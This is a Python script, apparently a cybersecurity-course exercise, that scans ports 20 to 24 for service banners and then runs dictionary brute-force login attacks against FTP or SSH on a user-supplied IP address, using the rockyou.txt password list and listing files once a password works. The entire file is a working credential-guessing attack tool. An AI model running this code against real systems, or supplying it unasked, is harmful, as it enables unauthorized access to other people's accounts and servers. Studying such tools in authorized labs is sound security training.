import socket
import ftplib
import paramiko
import re
import sys
from datetime import datetime

class driger_bf:
    def __init__(me):
      me.list1 = []

    def wordlist(me):
        path = r"E:\HuckerU cyber\Python\My_brt_friend\My_brt_friend\rockyou.txt"
        file = open(path, "r")
        for line in file:
            line = line.replace("\n", "")
            me.list1.append(line)


    def banner_grabber(me):

        for port in range(20, 25):
            try:
                sock = socket.socket()
                print(f'trying port {port}')
                sock.connect((me.ip, port))
                sock.send("what the service?\r\n".encode())
                socket.setdefaulttimeout(1)
                ret = f'ip: {me.ip} port: {port} {sock.recv(2048).decode()}'
                print(ret)
            except:
                continue

    def brtforce_ftp(me):
        lib = ftplib.FTP()
        me.wordlist()
        username = input('enter username you want to attack: ')
        for password in me.list1:
            try:
                lib.connect(me.ip, 21, timeout=5)
                print(f'trying password{password}')
                lib.login(username, password)
                print(f'connected using password {password}')
                lib.dir()
                break

            except Exception as erorr:
                print(erorr)
                continue

    def brtforce_ssh(me):
        username = input('enter username you want to attack: ')
        lib = paramiko.SSHClient()
        lib.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        me.wordlist()
        for password in me.list1:
            try:
                lib.connect(me.ip, 22, username, password)
                stdin, stdout, stderr, = lib.exec_command('ls -la')
                print(stdout.read().decode())
                print(f'the password is {password}')
                break
            except Exception as error:
                print(f'password: {password} failed')
                print(error)
                continue

    def main(me):
        me.ip = input("Enter the ip address you want to attack: ")
        if not re.match(r'[0-9]+(?:\.[0-9]+){3}', me.ip):
            print('Invalid IP Address')
            return me.ip
        me.banner_grabber()
        ch = input('choose protocol ftp or ssh: ')
        if ch == 'ftp':
            me.brtforce_ftp()
        elif ch == 'ssh':
            me.brtforce_ssh()
        else:
            print("error wrong input please try again")
